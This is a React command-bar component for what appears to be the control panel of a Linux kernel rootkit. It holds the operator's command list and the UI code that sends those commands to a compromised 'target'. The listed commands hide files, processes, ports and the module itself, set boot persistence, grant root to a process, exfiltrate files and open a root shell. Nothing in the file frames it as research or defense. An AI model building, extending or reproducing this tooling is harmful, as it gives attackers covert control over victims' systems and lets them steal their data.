import { useState, useRef, useEffect, useCallback } from 'react'
import { Terminal, ChevronUp, ChevronDown, X, CheckCircle, XCircle, Loader } from 'lucide-react'

const COMMANDS = [
  { cmd: 'INFO', desc: 'Target hostname, kernel, arch' },
  { cmd: 'STATUS', desc: 'Module state and hide list counts' },
  { cmd: 'HIDE FILE <name>', desc: 'Hide entries matching NAME from getdents64' },
  { cmd: 'HIDE PID <pid>', desc: 'Hide process from /proc' },
  { cmd: 'HIDE CONTENT <string>', desc: 'Hide lines containing STRING from read()' },
  { cmd: 'HIDE PORT <port>', desc: 'Hide local port from /proc/net/tcp' },
  { cmd: 'HIDE MODULE', desc: 'Remove module from /proc/modules' },
  { cmd: 'UNHIDE FILE <index>', desc: 'Unhide file entry by index' },
  { cmd: 'UNHIDE PID <index>', desc: 'Unhide pid entry by index' },
  { cmd: 'UNHIDE CONTENT <index>', desc: 'Unhide content entry by index' },
  { cmd: 'UNHIDE PORT <index>', desc: 'Unhide port entry by index' },
  { cmd: 'UNHIDE MODULE', desc: 'Restore module to /proc/modules' },
  { cmd: 'UNHIDE ALL', desc: 'Clear all hide lists' },
  { cmd: 'LIST FILE', desc: 'List hidden files (or show one by index)' },
  { cmd: 'LIST PID', desc: 'List hidden pids (or show one by index)' },
  { cmd: 'LIST CONTENT', desc: 'List hidden content strings (or show one by index)' },
  { cmd: 'LIST PORT', desc: 'List hidden ports (or show one by index)' },
  { cmd: 'PERSIST', desc: 'Request boot persistence' },
  { cmd: 'UNPERSIST', desc: 'Remove boot persistence' },
  { cmd: 'ESCALATE <pid>', desc: 'Grant root credentials to PID' },
  { cmd: 'DOWNLOAD <path>', desc: 'Exfiltrate file from target' },
  { cmd: 'SHELL <port>', desc: 'Open interactive root shell' },
  { cmd: 'SHELL STATUS', desc: 'Check shell state' },
  { cmd: 'QUIT', desc: 'Disconnect from target' },
]

const _history = []

export function CmdBar({ onSend, query, targetId, busy }) {
  const [value, setValue] = useState('')
  const [expanded, setExpanded] = useState(false)
  const [results, setResults] = useState([])
  const [histIdx, setHistIdx] = useState(-1)
  const [suggestions, setSuggestions] = useState([])
  const [selSug, setSelSug] = useState(0)
  const inputRef = useRef(null)
  const resultsRef = useRef(null)

  const submit = useCallback(() => {
    const raw = value.trim()
    if (!raw) return
    const upper = raw.toUpperCase()
    setValue('')
    setSuggestions([])
    setHistIdx(-1)
    if (!_history.length || _history[_history.length - 1] !== raw)
      _history.push(raw)

    const entry = { cmd: raw, time: new Date().toLocaleTimeString(), status: 'pending', reply: null }
    setResults(prev => [entry, ...prev])
    setExpanded(true)

    if (upper === 'HELP') {
      entry.status = 'ok'
      entry.reply = COMMANDS.map(c => `${c.cmd.padEnd(26)} ${c.desc}`).join('\n')
      setResults(prev => [...prev])
      return
    }
    if (upper === 'CLEAR') {
      setResults([])
      setExpanded(false)
      return
    }

    if (query && targetId) {
      query(raw, targetId).then(r => {
        entry.status = r.ok ? 'ok' : 'error'
        entry.reply = r.reply || '(no response)'
        setResults(prev => [...prev])
      })
    } else {
      onSend(raw)
    }
  }, [value, onSend, query, targetId])

  const onInput = (v) => {
    setValue(v)
    setHistIdx(-1)
    const upper = v.toUpperCase().trim()
    if (!upper) { setSuggestions([]); return }
    const matches = COMMANDS.filter(c => c.cmd.startsWith(upper) || c.cmd.includes(upper))
    setSuggestions(matches.slice(0, 6))
    setSelSug(0)
  }

  const onKey = (e) => {
    if (suggestions.length && e.key === 'Tab') {
      e.preventDefault()
      const s = suggestions[selSug]
      const base = s.cmd.replace(/ <.*$/, '')
      setValue(base + (s.cmd.includes('<') ? ' ' : ''))
      setSuggestions([])
      return
    }
    if (suggestions.length && e.key === 'ArrowDown') {
      e.preventDefault()
      setSelSug(i => Math.min(i + 1, suggestions.length - 1))
      return
    }
    if (suggestions.length && e.key === 'ArrowUp') {
      e.preventDefault()
      setSelSug(i => Math.max(i - 1, 0))
      return
    }
    if (e.key === 'Enter') { submit(); return }
    if (e.key === 'Escape') { setSuggestions([]); setExpanded(false); return }
    if (!suggestions.length && e.key === 'ArrowUp') {
      e.preventDefault()
      if (_history.length) {
        const next = histIdx < 0 ? _history.length - 1 : Math.max(0, histIdx - 1)
        setHistIdx(next)
        setValue(_history[next])
      }
      return
    }
    if (!suggestions.length && e.key === 'ArrowDown') {
      e.preventDefault()
      if (histIdx >= 0) {
        const next = histIdx + 1
        if (next >= _history.length) { setHistIdx(-1); setValue('') }
        else { setHistIdx(next); setValue(_history[next]) }
      }
    }
  }

  useEffect(() => {
    if (resultsRef.current) resultsRef.current.scrollTop = 0
  }, [results.length])

  const statusIcon = (s) => {
    if (s === 'pending') return <Loader size={12} className="animate-spin text-fg-3" />
    if (s === 'ok') return <CheckCircle size={12} className="text-green" />
    return <XCircle size={12} className="text-red" />
  }

  return (
    <div className="border-t-2 border-border bg-secondary flex flex-col">
      {/* Results drawer */}
      {expanded && results.length > 0 && (
        <div ref={resultsRef} className="max-h-64 overflow-auto border-b border-border bg-bg">
          {results.map((r, i) => (
            <div key={i} className="px-4 py-2 border-b border-border last:border-b-0 hover:bg-bg-2">
              <div className="flex items-center gap-2">
                {statusIcon(r.status)}
                <span className="font-mono text-xs font-bold text-main">{r.cmd}</span>
                <span className="text-[10px] text-fg-3 ml-auto tabular-nums">{r.time}</span>
              </div>
              {r.reply && (
                <pre className="text-xs font-mono text-fg-3 mt-1 whitespace-pre-wrap break-all pl-5 max-h-40 overflow-auto">{r.reply}</pre>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Suggestions */}
      {suggestions.length > 0 && (
        <div className="border-b border-border bg-bg">
          {suggestions.map((s, i) => (
            <button key={s.cmd}
              className={`w-full text-left px-4 py-1.5 text-sm flex items-center gap-3 ${i === selSug ? 'bg-main/10' : 'hover:bg-bg-2'}`}
              onMouseDown={e => {
                e.preventDefault()
                const base = s.cmd.replace(/ <.*$/, '')
                setValue(base + (s.cmd.includes('<') ? ' ' : ''))
                setSuggestions([])
                inputRef.current?.focus()
              }}
            >
              <span className="font-mono text-xs font-bold">{s.cmd}</span>
              <span className="text-xs text-fg-3">{s.desc}</span>
            </button>
          ))}
        </div>
      )}

      {/* Input bar */}
      <div className={`flex items-center gap-2 px-4 py-2 ${busy ? 'opacity-50' : ''}`}>
        {busy
          ? <Loader size={14} className="text-amber animate-spin shrink-0" />
          : <Terminal size={14} className="text-main shrink-0" />}
        <input
          ref={inputRef}
          className="flex-1 bg-transparent text-sm font-mono outline-none placeholder:text-fg-3"
          placeholder={busy ? 'Target busy (downloading...) commands will queue until done' : 'Type a command... (Tab to complete, HELP for reference)'}
          value={value}
          onChange={e => onInput(e.target.value)}
          onKeyDown={onKey}
          spellCheck={false}
          autoComplete="off"
          disabled={busy}
        />
        {results.length > 0 && (
          <button className="p-1 text-fg-3 hover:text-fg" onClick={() => setExpanded(!expanded)} title={expanded ? 'Collapse' : 'Expand'}>
            {expanded ? <ChevronDown size={14} /> : <ChevronUp size={14} />}
          </button>
        )}
        {results.length > 0 && (
          <button className="p-1 text-fg-3 hover:text-red" onClick={() => { setResults([]); setExpanded(false) }} title="Clear history">
            <X size={14} />
          </button>
        )}
      </div>
    </div>
  )
}
